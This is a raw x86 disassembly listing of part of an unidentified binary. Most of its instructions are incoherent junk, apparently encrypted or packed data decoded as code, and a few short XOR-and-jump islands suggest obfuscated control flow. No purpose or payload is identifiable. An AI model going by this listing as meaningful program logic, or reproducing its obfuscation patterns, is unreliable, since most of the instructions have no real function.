  40bf65:	jne    0x40bf1a
  40bf67:	fsubrp st(4),st
  40bf69:	nop
  40bf6a:	jb     0x40bf9e
  40bf6c:	mov    ch,0x44
  40bf6e:	and    al,ch
  40bf70:	sbb    eax,0x662ee955
  40bf75:	jbe    0x40bf96
  40bf77:	cld    
  40bf78:	sbb    al,0xbe
  40bf7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf7b:	std    
  40bf7c:	jns    0x40bf6c
  40bf7e:	gs mov bh,0x48
  40bf81:	mov    ecx,0x7d8b638f
  40bf86:	or     BYTE PTR [ebx-0x75c945c1],cl
  40bf8c:	add    BYTE PTR [eax],al
  40bf8e:	xor    ax,dx
  40bf91:	mov    edx,0x3afc
  40bf96:	add    ax,dx
  40bf99:	cmp    ax,WORD PTR [edi]
  40bf9c:	je     0x40c934
  40bfa2:	mov    eax,DWORD PTR [ebp-0x14]
  40bfa5:	xor    eax,ecx
  40bfa7:	add    eax,esi
  40bfa9:	mov    DWORD PTR [ebp-0x24],eax
  40bfac:	jmp    0x40c2c5
  40bfb1:	int3   
  40bfb2:	into   
  40bfb3:	retf   
  40bfb4:	ror    cl,1
  40bfb6:	(bad)  
  40bfb8:	ficom  DWORD PTR [edi+ebx*4+0x6c]
  40bfbc:	cmc    
  40bfbd:	imul   ebp,DWORD PTR [ecx+0x3d],0xffffffa7
  40bfc1:	ds xchg esi,eax
  40bfc3:	js     0x40c03d
  40bfc5:	je     0x40c045
  40bfc7:	js     0x40c041
  40bfc9:	aas    
  40bfca:	in     eax,0x4b
  40bfcc:	into   
  40bfcd:	or     BYTE PTR [ebx+0x46],al
  40bfd0:	loop   0x40bf8d
  40bfd2:	xchg   ebx,eax
  40bfd3:	sahf   
  40bfd4:	mov    cl,0x3c
  40bfd6:	aaa    
  40bfd7:	xchg   edi,eax
  40bfd8:	(bad)  
  40bfdb:	call   0x5355:0x5aa9448c
  40bfe2:	push   ds
  40bfe3:	or     DWORD PTR [ecx-0x38311f2e],esi
  40bfe9:	inc    edi
  40bfea:	shl    BYTE PTR [edx+0x3fa20d09],1
  40bff0:	data16 fiadd DWORD PTR [ebp+0x569970eb]
  40bff7:	xor    esp,DWORD PTR [edx+0xa671232]
  40bffd:	mov    al,ds:0xdda31566
  40c002:	pop    ds
  40c003:	and    al,0xb2
  40c005:	xchg   DWORD PTR [bx+si-0x64e9],ecx
  40c00a:	mov    ebp,0x4b0833c3
  40c00f:	mov    ds:0xe3f6a106,eax
  40c014:	or     eax,0x9c57718f
  40c019:	ror    BYTE PTR [edx],0x88
  40c01c:	out    dx,eax
  40c01d:	mov    BYTE PTR [edi],0xe5
  40c020:	mov    bl,0x94
  40c022:	in     eax,0xb9
  40c024:	add    ecx,edi
  40c026:	jns    0x40c005
  40c028:	sbb    DWORD PTR [edi-0x78],0x78
  40c02c:	inc    edi
  40c02d:	mov    DWORD PTR [ebp+ebp*1-0xe],ecx
  40c031:	call   0x6bf:0xf6e9028c
  40c038:	push   0x1d086629
  40c03d:	retf   
  40c03e:	xchg   ebx,eax
  40c03f:	mov    eax,0x88a8876
  40c044:	cdq    
  40c045:	add    BYTE PTR [eax],al
  40c047:	mov    ah,0xf5
  40c049:	adc    DWORD PTR [edi+0xcb407],ecx
  40c04f:	mov    edx,0xab47acc7
  40c054:	push   edi
  40c055:	je     0x40c0b4
  40c057:	test   al,0x75
  40c059:	inc    edi
  40c05a:	jb     0x40c0d8
  40c05c:	and    edi,DWORD PTR gs:[ecx-0x33]
  40c060:	ins    DWORD PTR es:[edi],dx
  40c061:	jle    0x40c0b5
  40c063:	aas    
  40c064:	lods   eax,DWORD PTR ds:[esi]
  40c065:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c066:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c067:	aaa    
  40c068:	imul   ebp,esi,0x2a5cb48f
  40c06e:	xchg   esp,eax
  40c06f:	repz pop edx
  40c071:	push   ebp
  40c072:	jne    0x40c017
  40c074:	unpckhps xmm3,XMMWORD PTR [esi+0x1640d573]
  40c07b:	push   esp
  40c07c:	ds ins BYTE PTR es:[edi],dx
  40c07e:	jmp    0xab77:0xc23ac43
  40c085:	cwde   
  40c086:	xchg   ebx,eax
  40c087:	outs   dx,BYTE PTR ds:[esi]
  40c088:	gs cwde 
  40c08a:	xchg   BYTE PTR [esi+0xf892021],ch
  40c090:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c091:	cmc    
  40c092:	or     DWORD PTR [esi],0x1e2538f3
  40c098:	add    DWORD PTR [ebx],ecx
  40c09a:	inc    ebx
  40c09b:	mov    esp,0xae08a3d5
  40c0a0:	icebp  
  40c0a1:	inc    eax
  40c0a2:	cwde   
  40c0a3:	rcl    DWORD PTR [ebx+0x73],cl
  40c0a6:	in     eax,dx
  40c0a7:	(bad)  
  40c0a9:	daa    
  40c0aa:	loopne 0x40c046
  40c0ac:	ds cmp ah,bl
  40c0af:	scas   eax,DWORD PTR es:[edi]
  40c0b0:	push   ss
  40c0b1:	fcomip st,st(6)
  40c0b3:	aam    0x87
  40c0b5:	jl     0x40c060
  40c0b7:	adc    al,BYTE PTR [eax-0x35]
  40c0ba:	neg    DWORD PTR [ebx-0x31]
  40c0bd:	add    al,0x41
  40c0bf:	sbb    esp,DWORD PTR [ecx-0x35]
  40c0c2:	hlt    
  40c0c3:	adc    DWORD PTR [ebx-0x72174788],esp
  40c0c9:	add    ecx,edx
  40c0cb:	dec    ecx
  40c0cc:	sub    eax,0xeb4f478d
  40c0d1:	and    bl,BYTE PTR [di-0x7e]
  40c0d5:	sub    ecx,ecx
  40c0d7:	rol    DWORD PTR [ecx],cl
  40c0d9:	pop    ecx
  40c0da:	repz aad 0x3a
  40c0dd:	xchg   esp,eax
  40c0de:	shl    ecx,0x74
  40c0e1:	push   eax
  40c0e2:	neg    bl
  40c0e4:	stos   DWORD PTR es:[edi],eax
  40c0e5:	popa   
  40c0e6:	pop    ss
  40c0e7:	jle    0x40c136
  40c0e9:	jno    0x40c0be
  40c0eb:	jmp    0x40c11c
  40c0ed:	stc    
  40c0ee:	jle    0x40c10e
  40c0f0:	aaa    
  40c0f1:	call   0xce8d9728
  40c0f6:	mov    al,cl
  40c0f8:	sbb    eax,0xc22349be
  40c0fd:	fdivr  QWORD PTR [edi]
  40c0ff:	push   es
  40c100:	int    0x8d
  40c102:	fdivr  QWORD PTR ds:0x916509cb
  40c108:	ja     0x40c11c
  40c10a:	add    eax,0xa6a352bc
  40c10f:	enter  0xad06,0x52
  40c113:	sbb    edx,DWORD PTR [edi-0x76373f46]
  40c119:	int    0xab
  40c11b:	adc    ecx,DWORD PTR [edi-0xceb5e80]
  40c121:	mov    WORD PTR cs:[edi-0x51],?
  40c125:	cld    
  40c126:	arpl   WORD PTR [edi-0x41],di
  40c129:	pop    eax
  40c12a:	out    0xde,eax
  40c12c:	sbb    al,0x1
  40c12e:	shr    BYTE PTR [esi+0xa],cl
  40c131:	repz dec ebp
  40c133:	pop    ecx
  40c134:	mov    ch,0xd4
  40c136:	call   0xffe8895f
  40c13b:	xor    dl,BYTE PTR [ebp+0x6f]
  40c13e:	ja     0x40c195
  40c140:	jno    0x40c0e8
  40c142:	and    ecx,DWORD PTR [eax]
  40c144:	test   BYTE PTR [ebx-0x4d],dl
  40c147:	or     BYTE PTR [eax],bl
  40c149:	arpl   bp,si
  40c14b:	or     edx,DWORD PTR [edi]
  40c14d:	imul   esi,DWORD PTR [esi+0x69],0x3a98fe16
  40c154:	das    
  40c155:	adc    cl,BYTE PTR [esi+0x26e6aa5b]
  40c15b:	fcomi  st,st(6)
  40c15d:	ds jecxz 0x40c19e
  40c160:	rcr    BYTE PTR ds:[esi],cl
  40c163:	int    0x9e
  40c165:	xchg   DWORD PTR [ebp+0x7e451b47],edx
  40c16b:	inc    eax
  40c16c:	or     ch,cl
  40c16e:	int    0xa4
  40c170:	add    DWORD PTR [ebx+0xc34b9d7],eax
  40c176:	stc    
  40c177:	out    0x16,al
  40c179:	(bad)  [eax]
  40c17b:	mov    edx,ecx
  40c17d:	jbe    0x40c191
  40c17f:	call   0x89e8a77
  40c184:	rcr    BYTE PTR [ebx-0xa],1
  40c187:	xchg   edi,eax
  40c188:	inc    edx
  40c189:	sbb    DWORD PTR [edi-0x64],0xffffffb7
  40c18d:	iret   
  40c18e:	in     eax,dx
  40c18f:	jns    0x40c1e4
  40c191:	sar    DWORD PTR [ecx+0x4d86b155],0x20
  40c198:	sub    eax,0x2e8cff17
  40c19d:	out    dx,al
  40c19e:	adc    al,0x81
  40c1a0:	jmp    0x827c:0x6db05da4
  40c1a7:	les    edi,FWORD PTR [eax]
  40c1a9:	das    
  40c1aa:	sub    BYTE PTR [edx],dh
  40c1ac:	pop    esp
  40c1ad:	(bad)  
  40c1ae:	neg    edi
  40c1b0:	fnstcw WORD PTR [edi-0x6a]
  40c1b3:	mov    ds,WORD PTR es:[ecx+0x74]
  40c1b7:	fistp  WORD PTR [esp+ecx*4-0x7f589e61]
  40c1be:	xchg   ebp,eax
  40c1bf:	jl     0x40c23f
  40c1c1:	mov    esp,0x6671b292
  40c1c6:	mov    ecx,DWORD PTR [ebx+0x611cd23b]
  40c1cc:	aaa    
  40c1cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1ce:	mov    ds:0xdd2e5910,al
  40c1d3:	cli    
  40c1d4:	aad    0xc
  40c1d6:	dec    esi
  40c1d7:	test   eax,0xe8764cc9
  40c1dc:	adc    eax,0xc2968ce
  40c1e1:	ficomp DWORD PTR [ebx+0x16a65573]
  40c1e7:	inc    ebp
  40c1e8:	and    bl,dh
  40c1ea:	pop    esi
  40c1eb:	cmp    esp,DWORD PTR [eax+0x34877dff]
  40c1f1:	shl    BYTE PTR [edx-0x2e276c9a],1
  40c1f7:	fild   QWORD PTR [esi+0x3b8eef65]
  40c1fd:	sub    eax,0xe2f1eede
  40c202:	push   esi
  40c203:	mov    dl,BYTE PTR [ecx+0x47357421]
  40c209:	push   ebx
  40c20a:	lock jge 0x40c1eb
  40c20d:	pusha  
  40c20e:	add    DWORD PTR [esi-0x390347c1],edx
  40c214:	aad    0x73
  40c216:	xor    ebx,ebp
  40c218:	cmp    esp,DWORD PTR [esi+0x2c]
  40c21b:	jle    0x40c1f1
  40c21d:	sbb    edx,DWORD PTR [edx-0x354dd9bd]
  40c223:	pop    ds
  40c224:	in     al,0xc8
  40c226:	nop
  40c227:	sub    ebx,esp
  40c229:	retf   
  40c22a:	shl    DWORD PTR [edx+0x7bd626ae],0xb3
  40c231:	ret    
  40c232:	xor    BYTE PTR [ebx-0x71b900c4],0xef
  40c239:	jge    0x40c2a9
  40c23b:	inc    ecx
  40c23c:	loopne 0x40c289
  40c23e:	out    dx,eax
  40c23f:	mov    ch,0x68
  40c241:	ret    0xf28
  40c244:	mov    bl,0xa0
  40c246:	push   edx
  40c247:	jp     0x40c1d2
  40c249:	(bad)  
  40c24a:	adc    ebx,DWORD PTR [ebx]
  40c24c:	mov    ebx,0xa7cdbdf3
  40c251:	fmul   QWORD PTR [ebx+0x77]
  40c254:	sbb    al,0x6e
  40c256:	pop    ds
  40c257:	das    
  40c258:	aaa    
  40c259:	sbb    DWORD PTR [ebp+0xa3cad54],0x18b8fed7
  40c263:	fldenv [eax-0x4]
  40c266:	pop    esi
  40c267:	mov    cl,0xbc
  40c269:	xor    al,0xaf
  40c26b:	das    
  40c26c:	(bad)  
  40c26d:	out    0x64,al
  40c26f:	sub    dh,ch
  40c271:	std    
  40c272:	rcl    BYTE PTR [ecx+0x5c23930d],cl
  40c278:	jp     0x40c2f4
  40c27a:	xor    BYTE PTR [edx+0x43],dh
  40c27d:	fdiv   QWORD PTR [ebx+0x3370dae1]
  40c283:	dec    edx
  40c284:	cmp    eax,0x2bfe4006
  40c289:	ds pop eax
  40c28b:	xor    DWORD PTR [ebp-0x5c],edx
  40c28e:	pop    esp
  40c28f:	mov    ebx,0xbcbec9b1
  40c294:	fiadd  DWORD PTR ds:[edx+0x3]
  40c298:	cs jnp 0x40c2b1
  40c29b:	mov    esp,0x89bc29a7
  40c2a0:	retf   0x359f
  40c2a3:	xlat   BYTE PTR ds:[ebx]
  40c2a4:	or     ebp,DWORD PTR [ebp+0xd]
  40c2a7:	test   BYTE PTR [edi+edx*4],0xa7
  40c2ab:	out    dx,al
  40c2ac:	mov    edi,DWORD PTR [esi]
  40c2ae:	push   edx
  40c2af:	iret   
  40c2b0:	scas   eax,DWORD PTR es:[edi]
  40c2b1:	xor    DWORD PTR [edi],eax
  40c2b3:	in     al,0xa3
  40c2b5:	xchg   edx,eax
  40c2b6:	lds    ebp,FWORD PTR [esi+0xf]
  40c2b9:	xor    eax,DWORD PTR [edx]
  40c2bb:	int    0xad
  40c2bd:	sbb    BYTE PTR [edx-0x27],0x7c
  40c2c1:	js     0x40c317
  40c2c3:	adc    al,0x53
  40c2c5:	mov    eax,DWORD PTR [ebp-0x28]
  40c2c8:	mov    di,WORD PTR [ebp-0x2c]
  40c2cc:	mov    ebx,0x8a36
  40c2d1:	jmp    0x40c5ea
  40c2d6:	xlat   BYTE PTR ds:[ebx]
  40c2d7:	cmp    al,0xc4
  40c2d9:	ds fcmovnb st,st(6)
  40c2dc:	(bad)  
  40c2de:	js     0x40c267
  40c2e0:	adc    BYTE PTR [eax-0x7e],bh
  40c2e3:	js     0x40c34a
  40c2e5:	xchg   esi,eax
  40c2e6:	cmp    bl,BYTE PTR [ebx+0x7e747878]
  40c2ec:	js     0x40c366
  40c2ee:	les    eax,FWORD PTR [edx-0xd]
  40c2f1:	cmp    eax,0xaeb082d
  40c2f6:	cmp    BYTE PTR [esp+esi*4+0x36],0xcd
  40c2fb:	xchg   ebx,eax
  40c2fc:	js     0x40c2d0
  40c2fe:	inc    ebx
  40c300:	and    BYTE PTR [esi-0x71],0x2b
  40c304:	cmp    ecx,esp
  40c306:	xor    ebp,esi
  40c308:	and    BYTE PTR [ebx+0x54],dh
  40c30b:	sbb    BYTE PTR [edi-0x64],dl
  40c30e:	sbb    al,0x84
  40c310:	into   
  40c311:	je     0x40c36f
  40c313:	jb     0x40c31c
  40c315:	adc    BYTE PTR [ecx-0x29d8b747],0xbf
  40c31c:	call   0xb4a9:0x981df189
  40c323:	loopne 0x40c3a4
  40c325:	fs aad 0xa3
  40c328:	mov    ecx,0xccd9bec9
  40c32d:	jnp    0x40c310
  40c32f:	sub    eax,0xd455c580
  40c334:	xchg   esi,eax
  40c335:	pop    es
  40c336:	dec    edx
  40c337:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c338:	sbb    ebx,DWORD PTR [esi-0x17]
  40c33b:	(bad)  
  40c33c:	arpl   dx,ax
  40c33e:	dec    ebx
  40c33f:	cld    
  40c340:	(bad)  
  40c341:	push   esi
  40c342:	xor    dh,0x1e
  40c345:	push   esp
  40c346:	and    ebx,DWORD PTR [ecx+0x767aaeb3]
  40c34c:	pop    ecx
  40c34d:	jle    0x40c2fa
  40c34f:	(bad)  
  40c350:	mov    edx,0x197b0ddc
  40c355:	dec    edi
  40c356:	fwait
  40c357:	jne    0x40c2e4
  40c359:	and    bh,BYTE PTR [esi-0x11]
  40c35c:	js     0x40c2e7
  40c35e:	cs mov ebp,0x4e898c6d
  40c364:	fcom   QWORD PTR ds:0xda506294
  40c36a:	sbb    dl,BYTE PTR [ecx+0xdfce836]
  40c370:	jle    0x40c30d
  40c372:	sbb    ecx,ecx
  40c374:	pop    edi
  40c375:	push   0x117afd8a
  40c37a:	ja     0x40c3bc
  40c37c:	data16 sti 
  40c37e:	pop    ds
  40c37f:	and    edi,DWORD PTR [eax-0x6f5021a4]
  40c385:	dec    ebx
  40c386:	dec    ecx
  40c387:	out    dx,eax
  40c388:	mov    bl,0xf2
  40c38a:	sub    esi,DWORD PTR [eax+0x75e18228]
  40c390:	push   ebx
  40c391:	sub    ecx,esp
  40c393:	mov    BYTE PTR [edi],dh
  40c395:	xlat   BYTE PTR ds:[ebx]
  40c396:	jmp    0xaaf9c7b9
  40c39b:	mov    dl,0x79
  40c39d:	hlt    
  40c39e:	arpl   WORD PTR [esi-0x61],cx
  40c3a1:	bnd jns 0x40c34f
  40c3a4:	rcr    DWORD PTR [ebp+0x14],cl
  40c3a7:	xor    cl,BYTE PTR [edi+ebx*1-0x29]
  40c3ab:	push   ebx
  40c3ac:	push   ax
  40c3ae:	(bad)  
  40c3af:	jmp    0x2ff69d6f
  40c3b4:	pop    esp
  40c3b5:	rcl    al,0x7a
  40c3b8:	fld    DWORD PTR [ebp+0x7e]
  40c3bb:	mov    eax,0x79048a19
  40c3c0:	mov    edx,0xc4ebbbf3
  40c3c5:	icebp  
  40c3c6:	or     DWORD PTR ds:0x2a782f3e,edi
  40c3cc:	dec    ebp
  40c3cd:	ins    DWORD PTR es:[edi],dx
  40c3ce:	ficomp WORD PTR [edi-0x4]
  40c3d1:	mov    si,0x4ba1
  40c3d5:	lds    edx,FWORD PTR [edi]
  40c3d7:	dec    edx
  40c3d8:	ror    DWORD PTR [edx+ecx*4+0x1c64c58d],cl
  40c3df:	ins    DWORD PTR es:[edi],dx
  40c3e0:	jno    0x40c366
  40c3e2:	aam    0x80
  40c3e4:	test   DWORD PTR ds:0xd92a359f,edx
  40c3ea:	mov    esp,0xb37b228
  40c3ef:	test   eax,0xb72f4e81
  40c3f4:	std    
  40c3f5:	in     al,0x4c
  40c3f7:	jmp    0xb998:0x3ef8148c
  40c3fe:	push   DWORD PTR [ebx]
  40c400:	sar    BYTE PTR [eax+0x40],cl
  40c403:	test   ebp,ebx
  40c405:	out    0x2f,eax
  40c407:	cmp    bh,ah
  40c409:	inc    di
  40c40b:	in     eax,0x1d
  40c40d:	cmp    ebx,0xa71fc09b
  40c413:	inc    esi
  40c414:	mov    WORD PTR [ecx+0x69007c6c],?
  40c41a:	sub    DWORD PTR ds:0xd0ffe29c,edx
  40c420:	addr16 mov bl,0xfc
  40c423:	loop   0x40c3ca
  40c425:	jg     0x40c3cc
  40c427:	cmp    eax,0x5876ebb2
  40c42c:	js     0x40c3cc
  40c42e:	add    ah,ch
  40c430:	ds xchg edx,eax
  40c432:	loopne 0x40c462
  40c434:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c435:	mov    ds:0xbcab1a68,al
  40c43a:	mov    ds:0x64023271,al
  40c43f:	int3   
  40c440:	sub    al,0xad
  40c442:	push   eax
  40c443:	imul   edx,DWORD PTR [edx+0x31],0x1f
  40c447:	in     al,0x5
  40c449:	inc    ebp
  40c44a:	push   0x6c8e7707
  40c44f:	imul   DWORD PTR [ebx]
  40c451:	fnstsw WORD PTR [eax+edx*1+0x22]
  40c455:	jg     0x40c3f6
  40c457:	dec    esi
  40c458:	call   0x29c6:0xd3596059
  40c45f:	mov    ebp,0x1f8de58c
  40c464:	lock je 0x40c414
  40c467:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c468:	mov    eax,0xf694ab1a
  40c46d:	push   ebp
  40c46e:	adc    BYTE PTR [edx],bh
  40c470:	vpsrlq xmm3,xmm3,XMMWORD PTR [ebx]
  40c474:	mov    ss,WORD PTR [ebx-0x16]
  40c477:	std    
  40c478:	cld    
  40c479:	jmp    0x9876acb4
  40c47e:	and    bl,ah
  40c480:	adc    al,0x54
  40c482:	lods   eax,DWORD PTR ds:[esi]
  40c483:	pop    ebp
  40c484:	cmp    eax,0xfa8c0672
  40c489:	dec    edi
  40c48a:	add    edx,DWORD PTR [ebx-0x509a6db0]
  40c490:	test   BYTE PTR [edi+0xc],0xbf
  40c494:	mov    al,0xe4
  40c496:	test   al,0xe3
  40c498:	cdq    
  40c499:	push   es
  40c49a:	cwde   
  40c49b:	call   0x8d3c:0xe57d416a
  40c4a2:	push   edi
  40c4a3:	push   edx
  40c4a4:	dec    eax
  40c4a5:	int    0x34
  40c4a7:	inc    edx
  40c4a8:	mov    DWORD PTR [ebp-0x58534b0],ebx
  40c4ae:	dec    ecx
  40c4af:	xchg   DWORD PTR [ecx],ebp
  40c4b1:	leave  
  40c4b2:	shl    DWORD PTR [edx+0x15],cl
  40c4b5:	test   BYTE PTR [edx],al
  40c4b7:	aad    0xfd
  40c4b9:	icebp  
  40c4ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4bb:	repnz inc ecx
  40c4bd:	jg     0x40c4f7
  40c4bf:	pop    ss
  40c4c0:	(bad)  
  40c4c1:	and    bh,BYTE PTR [ecx]
  40c4c3:	mov    edx,0x8458c92a
  40c4c8:	in     al,0x7e
  40c4ca:	dec    ebx
  40c4cb:	scas   eax,DWORD PTR es:[edi]
  40c4cc:	inc    edi
  40c4cd:	dec    esi
  40c4ce:	push   eax
  40c4cf:	shl    DWORD PTR [edx+0x2c],1
  40c4d2:	or     DWORD PTR [ebx],ebx
  40c4d4:	bound  edi,QWORD PTR [eax-0xd]
  40c4d7:	cmp    esi,DWORD PTR [ebx+edx*1]
  40c4da:	je     0x40c4dc
  40c4dc:	frstor [ecx+0x73]
  40c4df:	xchg   edx,eax
  40c4e0:	pop    esp
  40c4e1:	add    dh,dh
  40c4e3:	into   
  40c4e4:	imul   ecx,DWORD PTR [edx],0xffffffa7
  40c4e7:	daa    
  40c4e8:	rol    BYTE PTR [edx-0x28],1
  40c4eb:	pop    ebx
  40c4ec:	and    bl,BYTE PTR [edi]
  40c4ee:	add    eax,0xb03c0c17
  40c4f3:	inc    ecx
  40c4f4:	add    al,0x77
  40c4f6:	dec    ecx
  40c4f7:	into   
  40c4f8:	pop    ss
  40c4f9:	adc    al,0x2
  40c4fb:	sbb    DWORD PTR [ecx-0x23],ebp
  40c4fe:	inc    ebx
  40c4ff:	jne    0x40c4fb
  40c501:	das    
  40c502:	push   0x6
  40c504:	dec    ecx
  40c505:	rcl    BYTE PTR [ebx-0xd],0x96
  40c509:	inc    esp
  40c50a:	ret    
  40c50b:	jns    0x40c50f
  40c50d:	sbb    ebp,ebp
  40c50f:	dec    ecx
  40c510:	or     DWORD PTR [edx+0x7c],0x7c
  40c514:	add    eax,0x3c7d6f50
  40c519:	or     sp,WORD PTR [ecx]
  40c51c:	cmp    DWORD PTR [esi],ecx
  40c51e:	add    BYTE PTR [ebx-0x40],bh
  40c521:	or     DWORD PTR [ebx],ebx
  40c523:	push   0xffffff98
  40c525:	cmc    
  40c526:	mov    BYTE PTR [ecx],bh
  40c528:	inc    ecx
  40c529:	jp     0x40c502
  40c52b:	push   0x1c
  40c52d:	idiv   DWORD PTR [edi+0x3c6c998c]
  40c533:	cmp    BYTE PTR ds:0x997ef190,bl
  40c539:	sahf   
  40c53a:	cs sbb ah,ch
  40c53d:	sbb    dl,bl
  40c53f:	std    
  40c540:	and    DWORD PTR [ecx+0x62fe1e90],eax
  40c546:	cmp    eax,0xdf644ebc
  40c54b:	jle    0x40c56b
  40c54d:	lods   al,BYTE PTR ds:[esi]
  40c54e:	push   ecx
  40c54f:	sub    ch,BYTE PTR [edx+ebx*2]
  40c552:	test   al,0x5a
  40c554:	push   esi
  40c555:	pop    ss
  40c556:	imul   edx,DWORD PTR [esi-0xc],0x51
  40c55a:	sbb    DWORD PTR [edx+edi*8],esp
  40c55d:	leave  
  40c55e:	shl    DWORD PTR [ebp-0x24],1
  40c561:	idiv   DWORD PTR [esi]
  40c563:	sahf   
  40c564:	retf   
  40c565:	jmp    0x440f:0xf3e214b
  40c56c:	fimul  DWORD PTR [edi+0x42]
  40c56f:	fs cmp eax,0xa1d26809
  40c575:	and    esp,DWORD PTR [ecx+0x69]
  40c578:	xchg   BYTE PTR [esi+0x22583231],bh
  40c57e:	shr    BYTE PTR [ecx+0x7858ea40],1
  40c584:	gs add eax,0xd738271e
  40c58a:	stos   BYTE PTR es:[edi],al
  40c58b:	sti    
  40c58c:	loope  0x40c5fa
  40c58e:	inc    eax
  40c58f:	and    edx,edx
  40c591:	xchg   ebx,eax
  40c592:	mov    dh,0xca
  40c594:	xor    esp,DWORD PTR [ebx+0x3c0828f5]
  40c59a:	stos   BYTE PTR es:[edi],al
  40c59b:	in     al,0x37
  40c59d:	fstp   TBYTE PTR [edi]
  40c59f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5a0:	fwait
  40c5a1:	xor    ebx,DWORD PTR [edx]
  40c5a3:	cli    
  40c5a4:	cmc    
  40c5a5:	cmp    al,0x6a
  40c5a7:	xor    ebx,DWORD PTR ds:0xecf1e821
  40c5ad:	out    0x29,eax
  40c5af:	jg     0x40c605
  40c5b1:	jle    0x40c600
  40c5b3:	sub    al,0x40
  40c5b5:	cvtpi2ps xmm1,QWORD PTR [esi+0x5a]
  40c5b9:	xchg   DWORD PTR [edi-0xb708dc3],eax
  40c5bf:	imul   ebx,DWORD PTR [esi],0xaa602966
  40c5c5:	test   BYTE PTR [edx+0xe5d9600],dh
  40c5cb:	push   edx
  40c5cc:	jae    0x40c55f
  40c5ce:	js     0x40c5c9
  40c5d0:	sub    esp,esp
  40c5d2:	das    
  40c5d3:	push   ebp
  40c5d4:	push   0x202777a4
  40c5d9:	and    eax,0xe721ed5a
  40c5de:	mov    DWORD PTR [edi],edx
  40c5e0:	nop
  40c5e1:	mov    ch,0x6e
  40c5e3:	xchg   ecx,eax
  40c5e4:	mov    edi,0x592645c0
  40c5e9:	scas   eax,DWORD PTR es:[edi]
  40c5ea:	xor    di,bx
  40c5ed:	add    di,dx
  40c5f0:	movzx  edx,di
  40c5f3:	mov    edi,DWORD PTR [ebp-0x8]
  40c5f6:	xor    edi,ecx
  40c5f8:	lea    edx,[edx+edi*1+0x327298]
  40c5ff:	add    DWORD PTR [eax],edx
  40c601:	jmp    0x40c91a
  40c606:	cmp    eax,0xd9d2c1d7
  40c60b:	fcmove st,st(5)
  40c60d:	(bad)  ds:0x43d2d2f7
  40c613:	mov    dh,al
  40c615:	scas   eax,DWORD PTR es:[edi]
  40c616:	ss cwde 
  40c618:	js     0x40c692
  40c61a:	je     0x40c69a
  40c61c:	js     0x40c696
  40c61e:	xchg   edx,eax
  40c61f:	xchg   esp,eax
  40c620:	jge    0x40c636
  40c622:	push   ss
  40c623:	or     al,0x10
  40c625:	pop    esi
  40c626:	and    ecx,DWORD PTR ds:0x15f00ac7
  40c62c:	xor    esi,DWORD PTR [eax-0x28f2ea9f]
  40c632:	push   ebx
  40c633:	ins    DWORD PTR es:[edi],dx
  40c634:	push   edi
  40c635:	mov    bl,dl
  40c637:	cmp    al,0x2b
  40c639:	dec    esi
  40c63a:	sub    ah,cl
  40c63c:	jns    0x40c65f
  40c63e:	in     eax,0x17
  40c640:	jns    0x40c671
  40c642:	mov    edx,ebx
  40c644:	sbb    dh,cl
  40c646:	cmp    ch,al
  40c648:	cdq    
  40c649:	sub    ah,ch
  40c64b:	fs out 0x13,al
  40c64e:	adc    al,0xd5
  40c650:	inc    edi
  40c651:	cdq    
  40c652:	xor    eax,0x8e6e67ce
  40c657:	xchg   ecx,eax
  40c658:	mov    ch,0x12
  40c65a:	lock jl 0x40c6b9
  40c65d:	(bad)  
  40c65e:	pushf  
  40c65f:	fnsave [esp+edi*2-0x7c]
  40c663:	jecxz  0x40c626
  40c665:	pop    esi
  40c666:	leave  
  40c667:	or     eax,0x52c0dacd
  40c66c:	adc    ch,ch
  40c66e:	cmp    al,0x5e
  40c670:	or     BYTE PTR fs:[ebx],ah
  40c673:	cmp    esi,DWORD PTR [esi-0x1c902dae]
  40c679:	cmp    BYTE PTR [edx-0x12],dh
  40c67c:	xchg   ebx,eax
  40c67d:	add    BYTE PTR [eax+ebp*1+0x5b],cl
  40c681:	push   es
  40c682:	leave  
  40c683:	aas    
  40c684:	iret   
  40c685:	xchg   DWORD PTR [eax],esi
  40c687:	stos   DWORD PTR es:[edi],eax
  40c688:	sbb    edx,DWORD PTR [edx]
  40c68a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c68b:	cmp    edi,DWORD PTR [edx]
  40c68d:	mov    eax,0x437ee41e
  40c692:	xchg   ebx,eax
  40c693:	adc    al,0x2c
  40c695:	mov    bl,0x7b
  40c697:	fidiv  DWORD PTR [ebp-0x6514e43c]
  40c69d:	sbb    eax,0x49b4b5e
  40c6a2:	push   cs
  40c6a3:	mov    edi,0xc373d0cb
  40c6a8:	out    dx,al
  40c6a9:	(bad)  
  40c6aa:	mov    ecx,0x17e727a4
  40c6af:	xor    eax,0xffffff9e
  40c6b2:	popa   
  40c6b3:	pop    edx
  40c6b4:	and    al,0xd3
  40c6b6:	in     eax,0xc
  40c6b8:	outs   dx,DWORD PTR ds:[esi]
  40c6b9:	imul   ebx,edx,0x935dd3d7
  40c6bf:	mov    esp,0x4bc2b007
  40c6c4:	out    dx,al
  40c6c5:	add    al,0x5a
  40c6c7:	bound  ebx,QWORD PTR [ecx]
  40c6c9:	sub    DWORD PTR [ebx],edi
  40c6cb:	adc    dh,cl
  40c6cd:	adc    DWORD PTR [edx],esi
  40c6cf:	repnz push edx
  40c6d1:	je     0x40c6c4
  40c6d3:	retf   0x85ad
  40c6d6:	dec    ecx
  40c6d7:	psubusb mm4,QWORD PTR [ebp-0x5d]
  40c6db:	out    0x4d,al
  40c6dd:	sub    ecx,DWORD PTR [ebx-0x76]
  40c6e0:	mov    eax,0xc7493f50
  40c6e5:	dec    edx
  40c6e6:	pushf  
  40c6e7:	sub    DWORD PTR [ecx-0x1f],esp
  40c6ea:	mov    ebx,0xb233bac0
  40c6ef:	inc    BYTE PTR [ebx-0x331445ff]
  40c6f5:	je     0x40c73d
  40c6f7:	test   al,0xb6
  40c6f9:	js     0x40c76b
  40c6fb:	fsub   DWORD PTR [ecx]
  40c6fd:	xchg   DWORD PTR [ecx-0x2b],edx
